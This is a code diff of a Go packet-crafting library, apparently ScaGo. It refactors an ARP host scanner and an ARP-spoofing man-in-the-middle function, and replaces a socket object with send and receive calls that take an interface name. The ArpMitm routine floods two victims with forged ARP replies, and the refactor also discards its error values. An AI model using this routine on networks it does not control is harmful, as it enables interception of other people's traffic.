@@ -4,7 +4,7 @@ import (
 	"fmt"
 	"github.com/google/gopacket/layers"
 	"github.com/tiagomdiogo/ScaGo/packet"
-	"github.com/tiagomdiogo/ScaGo/supersocket"
+	communication "github.com/tiagomdiogo/ScaGo/supersocket"
 	"github.com/tiagomdiogo/ScaGo/utils"
 	"log"
 	"net"
@@ -13,21 +13,14 @@ import (
 )
 
 func ARPScanHost(iface string, targetIP string) (string, error) {
-	// Get MAC address of interface
 	srcMAC := utils.MacByInt(iface)
-	// Get IP address of interface
 	srcIP := utils.IPbyInt(iface)
-	// Create a new SuperSocket
-	ss, err := supersocket.NewSuperSocket(iface, "")
-	if err != nil {
-		return "", err
-	}
-	//Craft ETH Layer
+
 	ethLayer := packet.EthernetLayer()
 	ethLayer.SetSrcMAC(srcMAC)
 	ethLayer.SetDstMAC("ff:ff:ff:ff:ff:ff")
 	ethLayer.SetEthernetType(layers.EthernetTypeARP)
-	// Craft ARP Request Layer
+
 	arpRequest := packet.ARPLayer()
 	arpRequest.SetSrcMac(srcMAC)
 	arpRequest.SetSrcIP(srcIP)
@@ -41,22 +34,14 @@ func ARPScanHost(iface string, targetIP string) (string, error) {
 	}
 
 	for {
-		err = ss.Send(arpRequestPacket)
-		if err != nil {
-			return "", err
-		}
-		pkt, err := ss.Recv()
-		if err != nil {
-			return "", err
-		}
+		communication.Send(arpRequestPacket, iface)
+		pkt := communication.Recv(iface)
 
-		// Parse the packet
 		arpLayer := utils.GetARPLayer(pkt)
-
 		if arpLayer != nil && arpLayer.Operation == layers.ARPReply && net.IP(arpLayer.SourceProtAddress).String() == targetIP {
-			ss.Close()
 			return net.HardwareAddr(arpLayer.SourceHwAddress).String(), nil
 		}
+
 		time.Sleep(1 * time.Second)
 	}
 }
@@ -76,30 +61,24 @@ func disableIPForwarding() {
 func ArpMitm(iface, victim1, victim2 string) {
 	enableIPForwarding(iface)
 	defer disableIPForwarding()
-
-	ss, err := supersocket.NewSuperSocket(iface, "")
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	macVictim1, err := ARPScanHost(iface, victim1)
-	macVictim2, err := ARPScanHost(iface, victim2)
+	macVictim1, _ := ARPScanHost(iface, victim1)
+	macVictim2, _ := ARPScanHost(iface, victim2)
 
 	intMac := utils.MacByInt(iface)
 	arpPacket1, arpPacket2 := CreateFakeArp(victim1, victim2, macVictim1, macVictim2, intMac)
 
 	for i := 0; i < 100; i++ {
-		ss.Send(arpPacket1)
+		communication.Send(arpPacket1, iface)
 		time.Sleep(1 * time.Second)
-		ss.Send(arpPacket2)
+		communication.Send(arpPacket2, iface)
 	}
 	fmt.Println("[*] Restoring targets...")
 
-	restoreArp(macVictim1, victim1, victim2, macVictim2, err, ss)
+	restoreArp(macVictim1, victim1, victim2, macVictim2, iface)
 	fmt.Println("[*] Shutting down...")
 }
 
-func restoreArp(macVictim1, victim1, victim2, macVictim2 string, err error, ss *supersocket.SuperSocket) {
+func restoreArp(macVictim1, victim1, victim2, macVictim2 string, iface string) {
 	ethLayer1 := packet.EthernetLayer()
 	ethLayer1.SetDstMAC(macVictim1)
 	ethLayer1.SetSrcMAC(macVictim2)
@@ -128,8 +107,8 @@ func restoreArp(macVictim1, victim1, victim2, macVictim2 string, err error, ss *
 		log.Fatal(err)
 	}
 
-	ss.Send(OriginalArp1)
-	ss.Send(OriginalArp2)
+	communication.Send(OriginalArp1, iface)
+	communication.Send(OriginalArp2, iface)
 }
 
 func CreateFakeArp(victim1, victim2, macVictim1, macVictim2, srcMac string) ([]byte, []byte) {
